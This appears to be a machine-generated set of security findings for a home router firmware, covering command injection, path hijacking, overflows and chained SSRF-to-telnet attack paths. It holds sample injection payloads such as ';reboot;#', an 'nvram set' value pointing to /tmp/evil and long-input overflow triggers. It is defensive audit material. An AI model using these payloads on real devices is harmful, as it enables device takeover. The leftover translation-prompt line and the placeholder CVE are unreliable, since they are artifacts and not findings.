{"name": "path-traversal-cp_installer-param2", "file_path": "usr/sbin/cp_installer.sh", "location": "usr/sbin/cp_installer.sh:17-21,66", "risk_score": 7.5, "confidence": 7.25, "description": "The $2 parameter can be exploited for path traversal attacks: LOCAL_DIR=${2} is directly concatenated as CP_INSTALL_DIR=${LOCAL_DIR}/cp.d without checking for special characters like ../. An attacker can redirect the installation directory to sensitive locations (e.g., /etc) and overwrite configuration files through subsequent write operations. Trigger condition: controlling the $2 parameter value (e.g., passing '/tmp/../../etc').", "code_snippet": "LOCAL_DIR=${2}\nCP_INSTALL_DIR=${LOCAL_DIR}/cp.d\nmkdir ${CP_INSTALL_DIR}", "link_identifiers": ["LOCAL_DIR=${2}", "CP_INSTALL_DIR=${LOCAL_DIR}/cp.d", "mkdir ${CP_INSTALL_DIR}"], "notes": "The actual impact should be evaluated in conjunction with the firmware permission model (e.g., whether writing to /etc is permitted)."}
{"name": "env-injection-cp_installer-param3", "file_path": "usr/sbin/cp_installer.sh", "location": "usr/sbin/cp_installer.sh:17-21,54-56", "risk_score": 7.0, "confidence": 6.5, "description": "Environment Variable Injection Risk: The script unconditionally loads the ${PATH_ECO_ENV}/eco.env file (only checking readability) by specifying PATH_ECO_ENV=${3} through the $3 parameter. Attackers can manipulate the file content to inject malicious environment variables, affecting subsequent command behaviors (e.g., PATH hijacking). Trigger condition: Controlling the $3 parameter and being able to place a malicious eco.env file in the target path.", "code_snippet": "PATH_ECO_ENV=${3}\nif [ -r ${PATH_ECO_ENV}/eco.env ]; then\n  . ${PATH_ECO_ENV}/eco.env\nfi", "link_identifiers": ["PATH_ECO_ENV=${3}", "if [ -r ${PATH_ECO_ENV}/eco.env ]", ". ${PATH_ECO_ENV}/eco.env"], "notes": "Verify the actual security impact of environment variable usage scenarios in the firmware"}
{"name": "Command-Injection-NVRAM-Triggered-Service", "file_path": "REDACTED_SENSITIVE_DATA", "location": "HIDDENmain @ 0x8f5c", "risk_score": 8.5, "confidence": 8.0, "description": "The program reads the NVRAM configuration items 'telnetd_enable' and 'parser_enable' through acosNvramConfig_match and directly invokes system() to execute the 'utelnetd' and 'parser' commands without any input validation. If an attacker tampers with NVRAM values (e.g., via unauthorized configuration interfaces), they can arbitrarily start or stop services: 1) Enabling/disabling the telnet service affects remote access control; 2) Enabling/disabling the parser service may disrupt system functionality. Combined with the daemon process characteristics, this could enable a persistent backdoor. The trigger condition is the pollution of NVRAM configuration items, and the likelihood of exploitation depends on the existence of NVRAM write vulnerabilities.", "code_snippet": "if (sym.imp.acosNvramConfig_match(\"telnetd_enable\",0xbe5c) != 0) {\n    sym.imp.system(\"utelnetd\");\n}\nif (sym.imp.acosNvramConfig_match(\"parser_enable\",0xbe5c) != 0) {\n    sym.imp.system(\"parser\");\n}", "link_identifiers": ["acosNvramConfig_match", "telnetd_enable", "parser_enable", "system", "utelnetd", "parser", "daemon"], "notes": "The complete attack chain requires exploitation of an NVRAM write vulnerability. Subsequent analysis directions: 1) Security audit of NVRAM configuration interfaces 2) Vulnerability analysis of utelnetd/parser services. Related keywords: acosNvramConfig_get, acosNvramConfig_set, nvram, telnet"}
{"name": "env-injection-leafp2p-sys_prefix", "file_path": "etc/init.d/leafp2p.sh", "location": "etc/init.d/leafp2p.sh:6-8", "risk_score": 9.0, "confidence": 8.75, "description": "The SYS_PREFIX variable is directly obtained via `nvram get leafp2p_sys_prefix` without any filtering or validation. This variable is used to construct critical script paths (${SYS_PREFIX}/bin/checkleafnets.sh) and modify the PATH environment variable. An attacker could inject malicious paths (e.g., '/tmp/evil') by tampering with NVRAM values, leading to: 1) Execution of attacker-controlled scripts (${CHECK_LEAFNETS} &) during service startup 2) PATH pollution causing the system to prioritize searching malicious directories. Trigger conditions: The attacker must be able to modify NVRAM (e.g., through web vulnerabilities) and the service must restart/start. Security impact: Enables remote code execution (RCE).", "code_snippet": "SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)\nCHECK_LEAFNETS=${SYS_PREFIX}/bin/checkleafnets.sh\nPATH=${SYS_PREFIX}/bin:...", "link_identifiers": ["SYS_PREFIX", "leafp2p_sys_prefix", "nvram", "PATH", "CHECK_LEAFNETS"], "notes": "Verify whether the NVRAM settings interface (e.g., web backend) is exposed and lacks write protection"}
{"name": "path-pollution-leafp2p-PATH", "file_path": "etc/init.d/leafp2p.sh", "location": "etc/init.d/leafp2p.sh:10", "risk_score": 8.5, "confidence": 9.0, "description": "The PATH environment variable places ${SYS_PREFIX}/bin before the system path, and the source of SYS_PREFIX is untrusted. Attackers can place malicious programs in this path to replace system commands (such as killall/sed, etc.), triggering malicious code execution when scripts call these commands. Trigger condition: Execution of any command dependent on PATH after SYS_PREFIX is compromised. Security impact: Privilege escalation and persistent control.", "code_snippet": "PATH=${SYS_PREFIX}/bin:${SYS_PREFIX}/usr/bin:/sbin:/usr/sbin:/bin:/usr/bin", "link_identifiers": ["PATH", "SYS_PREFIX"], "notes": "Path injection can be combined with the killall vulnerability to form an exploitation chain and enhance attack effectiveness."}
{"name": "command-hijack-leafp2p-killall", "file_path": "etc/init.d/leafp2p.sh", "location": "etc/init.d/leafp2p.sh:17-19", "risk_score": 8.0, "confidence": 8.0, "description": "The killall command directly uses fixed process names (killall checkleafnets.sh/killall -INT leafp2p), but the PATH environment variable has been contaminated by SYS_PREFIX. If an attacker controls the ${SYS_PREFIX}/bin directory and places a malicious killall program, malicious code will be executed when stopping the service. Trigger condition: Executing /etc/init.d/leafp2p.sh stop after SYS_PREFIX is contaminated. Security impact: Predefined malicious code is triggered through service stop operations.", "code_snippet": "killall checkleafnets.sh 2>/dev/null\nkillall -INT leafp2p 2>/dev/null", "link_identifiers": ["killall", "checkleafnets.sh", "leafp2p", "stop"], "notes": "Command injection.  \n\nSuggested follow-up: Analyze service management mechanisms (e.g., /etc/rc.d) to verify the triggering method of stop commands."}
{"name": "AttackChain-Summary-SSRF-to-RCE", "file_path": "usr/sbin/upgrade.sh", "location": "N/A (HIDDEN)", "risk_score": 9.5, "confidence": 5.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["SSRF-GenieCGI-t-param", "CMD-INJECTION-UPGRADE_SH-PARAM", "PATH-TRAVERSAL-UPGRADE_SH-FILEOPS", "SCRIPT-HIJACK-UPGRADE_SH-SETUP", "nvram set", "genie_remote_url", "QUERY_STRING", "t=", "stop_sys", "/tmp/trend"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "ExploitChain-cp_installer-env-injection-to-leafp2p-rce", "file_path": "usr/sbin/cp_installer.sh", "location": "usr/sbin/cp_installer.sh:54-56 → etc/init.d/leafp2p.sh:8-12", "risk_score": 9.8, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["PATH_ECO_ENV=${3}", ". ${PATH_ECO_ENV}/eco.env", "nvram set leafp2p_sys_prefix", "SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)", "${CHECK_LEAFNETS} &"], "notes": "Verification required: 1) Whether eco.env supports nvram commands 2) Leafp2p service restart mechanism 3) Writable status of /tmp directory"}
{"name": "Full-AttackChain-NVRAM-Write-to-Telnet-RCE", "file_path": "REDACTED_SENSITIVE_DATA", "location": "HIDDEN: genie.cgi → RMT_invite.cgi → acos_service", "risk_score": 9.2, "confidence": 8.35, "description": "Full Attack Chain Verification: 1) Initial Entry: Attacker sends malicious requests via SSRF vulnerability (SSRF-GenieCGI-t-param) 2) NVRAM Pollution: Exploits unauthorized interface (e.g., RMT_invite.cgi) to execute 'nvram set telnetd_enable=1' and tamper with configuration 3) Command Injection: Main function reads polluted value and executes system(\"utelnetd\") to start service 4) Persistence: Daemon process characteristics enable backdoor persistence. Trigger Conditions: a) SSRF vulnerability allows access to internal interfaces b) NVRAM write interface lacks authentication c) Target service contains vulnerabilities. Exploit Probability: 8.2 (Requires verification of actual write operations in RMT_invite.cgi)", "link_identifiers": ["SSRF-GenieCGI-t-param", "nvram set", "telnetd_enable", "acosNvramConfig_match", "system", "utelnetd", "RMT_invite.cgi"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "AttackChain-Verification-NVRAM-Write-Gap", "file_path": "etc/init.d/leafp2p.sh", "location": "N/A (HIDDEN)", "risk_score": 9.0, "confidence": 4.75, "description": "Full attack chain verification failed: SSRF vulnerability (SSRF-GenieCGI-t-param) and leafp2p.sh environment injection vulnerability (env-injection-leafp2p-sys_prefix) have been confirmed, but the critical link between them—remote NVRAM write operation—is missing. Specific gaps: 1) No interfaces allowing remote writing of critical NVRAM variables like leafp2p_sys_prefix were found in the knowledge base 2) Suspicious files (/tmp/www/cgi-bin/RMT_invite.cgi and func.sh) remain unanalyzed 3) Existing CGI (genie.cgi) doesn't expose NVRAM write functionality. Trigger condition: Attacker needs to execute `nvram set leafp2p_sys_prefix=/tmp/evil` via unexposed interfaces. Security impact: Current attack chain is theoretically feasible but practically unexploitable (requires supplemental target file analysis).", "link_identifiers": ["nvram set", "RMT_invite.cgi", "func.sh", "SYS_PREFIX", "leafp2p_sys_prefix", "SSRF-GenieCGI-t-param"], "notes": "Follow-up action instructions: The following files must be reverse analyzed to verify attack chain integrity: 1)/tmp/www/cgi-bin/RMT_invite.cgi 2)/bin/func.sh or /sbin/func.sh"}
{"name": "Command-Injection-afp-config-generation", "file_path": "etc/init.d/afpd", "location": "rc.common:update_afpHIDDEN", "risk_score": 9.5, "confidence": 8.5, "description": "The `update_afp` function contains a command injection vulnerability when dynamically generating the AppleVolumes.default configuration file. Specific manifestations: 1) The SERVER_NAME value is obtained via `nvram get afp_name` 2) This value is directly used in the sed command (sed -e \"s/%%SERVER_NAME%%/$SERVER_NAME/g\") 3) No character filtering or boundary checking is performed. Attackers can set the afp_name NVRAM variable to inject malicious characters (e.g., ';reboot;#'), triggering arbitrary command execution when the service starts/reloads. High-risk trigger conditions: afpd running with REDACTED_PASSWORD_PLACEHOLDER privileges + existence of external interfaces for setting afp_name (e.g., web page) + service restart mechanism (e.g., kill -HUP).", "code_snippet": "SERVER_NAME=`nvram get afp_name`\ncat ... | sed -e \"s/%%SERVER_NAME%%/$SERVER_NAME/g\" > $VOLUMES_FILE", "link_identifiers": ["update_afp", "SERVER_NAME", "afp_name", "nvram get", "sed", "AppleVolumes.default", "VOLUMES_FILE"], "notes": "Full attack chain: Control afp_name → Contaminate SERVER_NAME → sed command injection → Arbitrary command execution with REDACTED_PASSWORD_PLACEHOLDER privileges. Verification required: 1) Execution permissions of /usr/sbin/afpd 2) Location of afp_name setting interface 3) Reload trigger mechanism"}
{"name": "HTTP-Download-Vulnerability-genmac.php", "file_path": "bin/startcircle", "location": "startcircle:15-22", "risk_score": 8.0, "confidence": 8.75, "description": "HTTP Download Vulnerability: The script downloads a MAC file from download.meetcircle.co to the $DIR directory using wget, only verifying the '8C:E2:DA:' prefix (which can be bypassed). The downloaded content is copied to /tmp/MAC but not directly executed. Trigger condition: Network hijacking during device startup (MITM attack). Security impact: If subsequent services use /tmp/MAC without validation, it could form an RCE exploit chain. Constraint check: Download is only triggered if the file does not exist, with no TLS encryption or integrity verification.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["wget", "MAC", "genmac.php", "ROUTERMAC", "/tmp/MAC", "grep \"^8C:E2:DA:\""], "notes": "Follow-up directions: 1) Analyze the usage of /tmp/MAC in services such as timetracker 2) Inspect the server-side vulnerability in genmac.php"}
{"name": "Kernel-Module-Loading-skipctf.ko", "file_path": "bin/startcircle", "location": "startcircle:42", "risk_score": 9.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "insmod $DIR/skipctf.ko", "link_identifiers": ["insmod", "skipctf.ko", "REDACTED_SENSITIVE_DATA"], "notes": "Next steps: 1) Verify permissions of the /mnt/shares/usr/bin directory 2) Perform reverse engineering analysis on the functionality of skipctf.ko"}
{"name": "HIDDEN-NVRAMHIDDEN-HIDDEN", "file_path": "bin/wps_monitor", "location": "binary:text:0xd548 [fcn.0000d548] → binary:text:0xc5f8 [fcn.0000c5f8]", "risk_score": 9.0, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "// fcn.0000d548HIDDEN\nsym.imp.sprintf(buffer, *0xe504, ...);\nfcn.0000c5f8(0,0,*0xe508,buffer);\n\n// fcn.0000c5f8HIDDEN\niVar1 = sym.imp.sprintf(*0xc6f0, *0xc6f4, param_3, param_4); // HIDDEN", "link_identifiers": ["fcn.0000d548", "fcn.0000c5f8", "nvram_get", "0xe504", "0xe508", "param_2", "param_3", "param_4", "0xc6f0"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "HIDDEN-mainHIDDEN-sprintfHIDDEN", "file_path": "bin/wps_monitor", "location": "binary:text:0xeb04 [main]", "risk_score": 0.5, "confidence": 4.75, "description": "Security verification in the main function (0xeb04): The sprintf operation is confirmed safe—format string fixed as '0x%x' (maximum output 10 bytes), destination buffer 144 bytes, input converted via strtoul with no overflow risk. Indicates no buffer overflow risk as originally reported.", "link_identifiers": ["main", "sprintf", "str.0x_x", "wps_config_method"], "notes": "Security verification"}
{"name": "Attack-Chain-HTTP-TZ-RCE", "file_path": "bin/startcircle", "location": "HIDDEN：bin/startcircle + timetrackerHIDDEN", "risk_score": 8.8, "confidence": 7.75, "description": "Multi-Stage Attack Chain Verification: HTTP download vulnerability (polluting /tmp/MAC) and environment variable pollution vulnerability (polluting TZ) both target the timetracker service. Exploitation path: 1) Hijack MAC download via MITM to inject malicious MAC value; 2) Tamper with get_tz command output to pollute TZ variable; 3) Trigger vulnerability when timetracker inherits polluted variables (requires reverse engineering confirmation). Constraints: Requires simultaneous control of network traffic and local execution environment (e.g., via kernel module vulnerability). Risk rating: High risk (8.8) due to multi-stage vulnerability chaining.", "link_identifiers": ["/tmp/MAC", "TZ", "timetracker", "get_tz", "wget"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "Config-Risk-NVRAM-Leafp2p-Vars", "file_path": "etc/init.d/remote.sh", "location": "etc/init.d/remote.sh", "risk_score": 3.0, "confidence": 5.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "leafp2p_remote_url=$(${nvram} get leafp2p_remote_url)\n[ -z $leafp2p_remote_url ] && ${nvram} set leafp2p_remote_url=\"http://peernetwork.netgear.com/...\"", "link_identifiers": ["leafp2p_sys_prefix", "leafp2p_remote_url", "leafp2p_debug", "nvram get", "nvram set"], "notes": "Track the usage of leafp2p_remote_url in network communication components."}
{"name": "Exposure-CGI-RMT_invite-Link", "file_path": "etc/init.d/remote.sh", "location": "etc/init.d/remote.sh:11-14", "risk_score": 6.0, "confidence": 6.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["ln -s", "REDACTED_SENSITIVE_DATA", "/tmp/www/cgi-bin", "mkdir -p"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command-injection-telnet-auth-bypass", "file_path": "bin/utelnetd", "location": "utelnetd:0x90a4 (fcn.000090a4)", "risk_score": 9.0, "confidence": 8.75, "description": "The utelnetd service contains an unauthenticated command injection vulnerability. Specifically, when processing the '-l' parameter sent by the client (corresponding to case 8 branch), the telnet service directly copies user input to the global structure (*0x9af4)[2] via strdup, only verifying path executability using access(path,1) (checking existence and execution permissions) without filtering special characters (such as semicolons). Attackers can craft malicious paths (e.g., \";reboot;\") to inject arbitrary commands. Trigger conditions: 1) The device has telnet service enabled 2) The attacker can establish a telnet connection and send commands with the '-l' parameter 3) Dependency on interpreter support for semicolon-separated commands (e.g., busybox). Successful exploitation allows attackers to execute arbitrary commands with REDACTED_PASSWORD_PLACEHOLDER privileges, achieving complete device control.", "code_snippet": "case 8:\n  puVar13 = sym.imp.strdup(*puVar16);\n  ppuVar17[2] = puVar13;\n...\niVar5 = sym.imp.access((*0x9af4)[2],1);\n...\nsym.imp.execv((*0x9af4)[2],*0x9af4 + 3);", "link_identifiers": ["fcn.000090a4", "0x9af4", "case 8", "strdup", "access", "execv", "0x9af8"], "notes": "Further verification required: 1) Default enabled status of telnet service in firmware 2) Whether the /bin/sh interpreter supports semicolon command separation 3) Whether web interfaces or startup scripts expose telnet configurations. Recommend checking /etc/inittab and relevant startup configurations in /etc/init.d/*."}
{"name": "buffer_overflow-eapd-nvram_strncpy-0x9e48", "file_path": "bin/eapd", "location": "bin/eapd:0x9e48 (fcn.00009e48)", "risk_score": 8.5, "confidence": 8.6, "description": "The function fcn.00009e48 contains a stack buffer overflow vulnerability. Specific manifestation: The strncpy function copies NVRAM variables (lan_ifnames/wan_ifnames) into a 16-byte stack buffer (auStack_18) with a fixed copy length of 0x10 bytes. Trigger condition: An attacker sets NVRAM values longer than 15 bytes via web/cli interfaces. Missing boundary checks: 1) No verification of source string actual length 2) No validation of destination buffer capacity 3) No null-byte termination guarantee. Security impact: Stack overflow can overwrite adjacent variables (including potential function pointers), leading to denial of service or remote code execution (RCE). Exploitation method: Crafting overly long NVRAM values to trigger control flow hijacking.", "code_snippet": "strncpy(puVar8, iVar2, 0x10); // HIDDEN16HIDDEN", "link_identifiers": ["strncpy", "lan_ifnames", "wan_ifnames", "fcn.00009e48", "auStack_18", "NVRAM", "buffer_overflow"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "StackOverflow-NVRAM-set-0x000088e8", "file_path": "usr/sbin/nvram", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 6.5, "confidence": 6.5, "description": "Stack buffer overflow vulnerability (corrected). Specific manifestations: 1) Attacker injects oversized data via `nvram set [var] [payload]` 2) strncpy(0x000088e8) copies user input to stack buffer (auStack_10012) 3) Requires ≥65,568 bytes to overwrite return address. Constraints: a) Input must be ≥65,568 bytes b) NVRAM storage limitations may prevent large payload writing. Security impact: Successful return address overwrite enables RCE, but practical exploitation probability is low due to large payload requirement and storage constraints.", "code_snippet": "0x000088e8: bl sym.imp.strncpy ; dest=auStack_10012, size=0x10000", "link_identifiers": ["strncpy", "auStack_10012", "0x000088e8", "0x10020", "set", "nvram"], "notes": "Verify the maximum variable length of NVRAM; it is recommended to test the maximum writable value in the actual firmware in subsequent steps; related point: NVRAM configuration interface."}
{"name": "REDACTED_SECRET_KEY_PLACEHOLDER-NVRAM-strsep-0x000088f8", "file_path": "usr/sbin/nvram", "location": "nvram:0x000088e8-0x000088f8", "risk_score": 8.0, "confidence": 9.0, "description": "Unterminated String Vulnerability (Confirmed). Specific manifestations: 1) When input length = 0x10000 bytes, strncpy fails to append a null terminator 2) strsep(0x000088f8) performs out-of-bounds memory reads until encountering a null byte. Trigger condition: Attacker supplies exactly 65536 bytes of input containing no null bytes (e.g.: `nvram set var $(dd if=/dev/zero bs=65536 count=1)`). Security impact: a) Potential leakage of sensitive stack memory contents b) Process crash (DoS). High exploitation probability due to reasonable payload requirements and ease of construction.", "code_snippet": "0x000088e8: strncpy(..., 0x10000)\n0x000088f8: strsep(...)", "link_identifiers": ["strncpy", "strsep", "0x000088e8", "0x000088f8", "0x10000", "nvram"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "AttackChain-Update-eapd-NVRAM-Overflow", "file_path": "bin/eapd", "location": "HIDDEN: genie.cgi → RMT_invite.cgi → bin/eapd", "risk_score": 9.2, "confidence": 4.5, "description": "Attack Chain Update: The newly discovered EAPD stack overflow vulnerability (buffer_overflow-eapd-nvram_strncpy-0x9e48) serves as the endpoint compromise point, requiring triggering through NVRAM write operations. Current attack chain status: initial entry point (SSRF-GenieCGI-t-param) exists, but the critical intermediate link - exposed lan_ifnames/wan_ifnames write interface remains unconfirmed. Full exploitation requires: 1) Presence of unauthorized NVRAM write interface (e.g., RMT_invite.cgi) capable of setting oversized lan_ifnames values 2) Regular reading of contaminated values by EAPD process 3) Stack layout controllability verification. Exploitation probability: 0.0 (currently no evidence of write interface) → 8.2 (if exposed interface is discovered)", "link_identifiers": ["SSRF-GenieCGI-t-param", "nvram set", "lan_ifnames", "wan_ifnames", "fcn.00009e48", "RMT_invite.cgi", "buffer_overflow"], "notes": "Attack Chain Update  \n\nCorrelation Discovery: 1) buffer_overflow-eapd-nvram_strncpy-0x9e48 (Endpoint Vulnerability) 2) AttackChain-Gap-NVRAM-Write (Common Gap) 3) Full-AttackChain-NVRAM-Write-to-Telnet-RCE (Similar Path Reference). Action Instruction: Reverse-engineer /tmp/www/cgi-bin/RMT_invite.cgi to verify NVRAM write capability."}
{"name": "AttackChain-Integration-NVRAM-Strsep-Vuln", "file_path": "usr/sbin/nvram", "location": "HIDDEN: genie.cgi → RMT_invite.cgi → nvram:0x000088f8", "risk_score": 9.0, "confidence": 4.5, "description": "Integrating the newly discovered unterminated string vulnerability into the attack chain: 1) Endpoint compromise: The unterminated string vulnerability (0x000088f8) enables memory leaks/DoS. 2) Attack chain gap: Still lacks an external input path to NVRAM write operations (requires RMT_invite.cgi verification). 3) Correlation: If RMT_invite.cgi contains unauthorized nvram set operations, attackers could combine it with the SSRF vulnerability (SSRF-GenieCGI-t-param) to precisely trigger this vulnerability. Security impact: a) Leakage of sensitive stack memory information b) Service crash. Exploit probability: Currently 0.0 (no write interface) → 8.5 (if write interface exists without protection).", "link_identifiers": ["REDACTED_SECRET_KEY_PLACEHOLDER-NVRAM-strsep-0x000088f8", "SSRF-GenieCGI-t-param", "RMT_invite.cgi", "nvram set", "0x000088f8", "strsep"], "notes": "Critical Action: Immediately conduct reverse analysis of /tmp/www/cgi-bin/RMT_invite.cgi to verify whether it contains 'nvram set' operations. Related Findings: AttackChain-Gap-NVRAM-Write, Full-AttackChain-NVRAM-Write-to-Telnet-RCE"}
{"name": "Full-AttackChain-SSRF-to-TelnetRCE", "file_path": "bin/utelnetd", "location": "HIDDEN: genie.cgi → RMT_invite.cgi → acos_service → utelnetd", "risk_score": 9.5, "confidence": 8.65, "description": "Full Attack Chain: The attacker accesses the internal interface RMT_invite.cgi through an SSRF vulnerability (SSRF-GenieCGI-t-param), leveraging its NVRAM write capability to set telnetd_enable=1. The system service acos_service reads the tainted value and executes system(\"utelnetd\") to start the service. The attacker connects to the telnet service and sends a malicious '-l ;reboot;' parameter, triggering utelnetd's unfiltered strdup/execv call chain to achieve REDACTED_PASSWORD_PLACEHOLDER-privileged command injection. Trigger conditions: 1) SSRF vulnerability allows access to internal interfaces 2) NVRAM write interface lacks authentication 3) Target uses a shell interpreter that supports semicolon separation.", "link_identifiers": ["SSRF-GenieCGI-t-param", "RMT_invite.cgi", "nvram set", "telnetd_enable", "acosNvramConfig_match", "system", "utelnetd", "fcn.000090a4", "case 8", "strdup", "execv", "/bin/sh"], "notes": "Full Attack Chain  \n\nImportant: Your response must contain only the translated English text. Do not add any introductory phrases, explanations, or Markdown formatting like ```.  \n\nComplete Verification: 1) RMT_invite.cgi must perform actual nvram set operations 2) Confirm /bin/sh supports semicolon command separation (common in busybox) 3) Check the device's default telnet status. Related Discovery IDs: command-injection-telnet-auth-bypass, Command-Injection-NVRAM-Triggered-Service"}
{"name": "Full-AttackChain-SSRF-to-TelnetRCE-Update", "file_path": "bin/utelnetd", "location": "HIDDEN: genie.cgi → [GAP] → acos_service → utelnetd", "risk_score": 7.0, "confidence": 3.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["SSRF-GenieCGI-t-param", "RMT_invite.cgi", "0xc1e4", "acosNvramConfig_match", "utelnetd", "fcn.000090a4"], "notes": "Attack Chain Verification  \n\nThe following files must be reverse-engineered to fill the gaps:  \n1) /tmp/www/cgi-bin/RMT_invite.cgi (critical)  \n2) /bin/func.sh  \nOriginal attack chain ID: Full-AttackChain-SSRF-to-TelnetRCE"}
{"name": "Verification-Requirement-RMT_invite.cgi-NVRAM", "file_path": "bin/utelnetd", "location": "/tmp/www/cgi-bin/RMT_invite.cgi", "risk_score": 9.8, "confidence": 0.0, "description": "Unverified Critical Capability: Whether the RMT_invite.cgi file contains nvram set operations. This verification directly impacts 3 high-risk attack chains (CVE-2023-XXXXX, etc.), involving: 1) Telnet service activation (telnetd_enable) 2) Environment variable injection (leafp2p_sys_prefix) 3) Buffer overflow trigger (lan_ifnames). Security Impact: If unauthorized write operations exist, attackers could achieve a complete control chain from network access to REDACTED_PASSWORD_PLACEHOLDER privileges.", "link_identifiers": ["RMT_invite.cgi", "nvram set", "0xc1e4", "fcn.00009e48", "SSRF-GenieCGI-t-param"], "notes": "Top-priority validation targets. Associated attack chains: Full-AttackChain-SSRF-to-TelnetRCE, AttackChain-Update-eapd-NVRAM-Overflow"}
{"name": "Verification-Gap-shell-Semicolon-Support", "file_path": "bin/utelnetd", "location": "HIDDEN: utelnetd → /bin/sh", "risk_score": 8.5, "confidence": 0.0, "description": "Analysis Gap  \n\nCritical Capability Unverified: The '/bin/sh' interpreter's semicolon command separation feature, which the Full-AttackChain-SSRF-to-TelnetRCE relies on, has not been confirmed. Specific gaps:  \n1) No code evidence in the knowledge base demonstrates that /bin/sh supports semicolon-separated commands (e.g., ';reboot;').  \n2) The actual shell type used by the device is unknown (could be busybox ash/dash, etc.).  \n3) Lack of a test environment to validate this feature.  \nSecurity Impact: Directly affects the feasibility of triggering the command injection vulnerability (command-injection-telnet-auth-bypass).", "link_identifiers": ["/bin/sh", "Full-AttackChain-SSRF-to-TelnetRCE", "command-injection-telnet-auth-bypass", "fcn.000090a4", "execv"], "notes": "Follow-up verification: 1) Check whether the file system contains /bin/busybox 2) Reverse-engineer /bin/sh to confirm if it's symbolically linked to busybox 3) If it's busybox, semicolon separation is supported by default. Related attack chain ID: Full-AttackChain-SSRF-to-TelnetRCE"}
{"name": "Full-AttackChain-SSRF-to-TelnetRCE-Update-2", "file_path": "bin/utelnetd", "location": "HIDDEN: genie.cgi → [GAP] → acos_service → utelnetd → [GAP] → /bin/sh", "risk_score": 6.0, "confidence": 2.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["Full-AttackChain-SSRF-to-TelnetRCE", "RMT_invite.cgi", "/bin/sh", "Verification-Gap-shell-Semicolon-Support", "execv"], "notes": "Original Attack Chain ID: Full-AttackChain-SSRF-to-TelnetRCE. Verification Item Priority: 1) RMT_invite.cgi reverse engineering 2) /bin/sh feature testing"}
{"name": "REDACTED_SECRET_KEY_PLACEHOLDER-NVRAM-strsep-0x000088f8", "file_path": "bin/utelnetd", "location": "usr/sbin/nvram:0x000088f8 (strsepHIDDEN)", "risk_score": 8.5, "confidence": 3.5, "description": "A risk of unterminated string was discovered in the NVRAM processing module (address 0x000088f8). Vulnerability mechanism: The strsep operation does not validate the terminator state of the input string. When an attacker writes crafted parameters via nvram set, it may lead to: 1) Stack memory out-of-bounds read (information leakage) 2) Service crash (DoS). Trigger conditions: 1) Existence of unauthorized nvram write interfaces (e.g., RMT_invite.cgi) 2) Writing specially formatted non-terminated strings. Technical evidence: Reverse engineering reveals that the strsep operation directly uses external input pointers without buffer boundary checks or terminator validation.", "link_identifiers": ["0x000088f8", "strsep", "nvram set", "RMT_invite.cgi", "REDACTED_SECRET_KEY_PLACEHOLDER", "memory corruption"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "AttackChain-Integration-NVRAM-Strsep-Vuln-Update", "file_path": "bin/utelnetd", "location": "HIDDEN: genie.cgi → [GAP] → nvram → 0x000088f8", "risk_score": 9.2, "confidence": 3.25, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SECRET_KEY_PLACEHOLDER-NVRAM-strsep-0x000088f8", "SSRF-GenieCGI-t-param", "RMT_invite.cgi", "strsep", "AttackChain-Integration-NVRAM-Strsep-Vuln"], "notes": "Original Attack Chain ID: AttackChain-Integration-NVRAM-Strsep-Vuln. Highest priority verification target: Reverse analysis of /tmp/www/cgi-bin/RMT_invite.cgi"}
{"name": "heap-overflow-iptables_do_command4-i_interface", "file_path": "usr/sbin/iptables", "location": "iptables:0xe950 (do_command4)", "risk_score": 9.0, "confidence": 9.25, "description": "The do_command4 function contains a critical heap overflow vulnerability when processing the '-i' network interface parameter: 1) User input (*(puVar32 + -0x48)) is fully controllable 2) The buffer allocated via xtables_calloc has a fixed size of 0x20 bytes (when target->size=0) 3) strcpy is used to directly copy user input without length validation. Trigger condition: Attacker supplies an interface name parameter ≥33 bytes (e.g., `iptables -A INPUT -i 'A'*1000`). Exploitation method: Carefully crafted long interface names can overwrite heap metadata, potentially enabling arbitrary code execution. Since iptables often runs with REDACTED_PASSWORD_PLACEHOLDER privileges, this could lead to complete device compromise.", "link_identifiers": ["do_command4", "case_0x69", "puVar32_-0x48", "xtables_calloc", "strcpy", "*(iVar11_0x10)"], "notes": "The actual attack chain requires the following conditions: 1) The firmware must have a network interface (such as a Web API) that calls iptables; 2) The interface does not filter the length of the interface name. It is recommended to further analyze the CGI scripts in the firmware's web service that invoke iptables."}
{"name": "boundary-defect-iptables_restore-chain_parsing", "file_path": "usr/sbin/iptables", "location": "iptables: (iptables_restore_main)", "risk_score": 4.0, "confidence": 7.5, "description": "The iptables-restore function has boundary condition flaws: 1) strncpy fails to append null terminators when copying chain names, causing out-of-bounds reads in subsequent string operations when input ≥32 bytes 2) The parameter parsing loop allows writing 1024 bytes into a 1020-byte buffer, but stack layout analysis shows overflow only corrupts local variables (auStack_64) without overwriting return addresses. Trigger conditions: malicious rule files containing ≥32-byte chain names or ≥992-byte quoted parameters. Actual impact: may cause program crashes but difficult to form code execution exploit chains.", "link_identifiers": ["iptables_restore_main", "strncpy", "auStack_28", "auStack_460", "puVar25_-0x444"], "notes": "The denial-of-service risk should be evaluated in conjunction with the firmware crash recovery mechanism."}
